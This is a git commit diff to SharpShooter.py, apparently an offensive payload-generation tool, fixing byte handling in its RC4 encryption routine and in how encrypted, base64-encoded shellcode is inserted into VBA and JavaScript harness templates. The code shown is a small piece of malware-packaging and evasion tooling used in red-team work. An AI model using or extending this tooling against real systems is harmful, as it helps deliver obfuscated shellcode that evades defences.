f109c443a415df7172554831f2513b21408dbfa2
imthoe <imhof98@gmx.net>
2021-01-05 05:12:36 -0500

    fixed rc4 error related to byte encoding

--- SharpShooter.py
+++ SharpShooter.py
@@ -195,9 +195,9 @@ class SharpShooter:
             i = (i + 1) % 256
             j = (j + S[i]) % 256
             S[i], S[j] = S[j], S[i]
-            out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
+            out.append(ord(char) ^ S[(S[i] + S[j]) % 256])
 
-        return ''.join(out)
+        return bytes(bytearray(out))
 
     def run(self, args):
 
@@ -444,7 +444,7 @@ End Sub"""
                     #    sc_split = [encoded_sc[i:i+100] for i in range(0, len(encoded_sc), 100)]
                     #    for i in sc_split:
                     #else:
-                    template_code = template_code.replace("%SHELLCODE64%", str(encoded_sc))
+                    template_code = template_code.replace("%SHELLCODE64%", encoded_sc.decode('ascii'))
 
                 else:
                     refs = args.refs
@@ -516,13 +516,13 @@ End Sub"""
 
         key = self.rand_key(10)
         payload_encrypted = self.rc4(key, template_code)
-        payload_encoded = base64.b64encode(bytes(payload_encrypted,'utf-8'))
+        payload_encoded = base64.b64encode(payload_encrypted)
 
         awl_payload_simple = ""
 
         if("js" in file_type or args.comtechnique):
             harness = self.read_file("templates/harness.js")
-            payload = harness.replace("%B64PAYLOAD%", str(payload_encoded))
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode('ascii'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
             awl_payload_simple = template_code
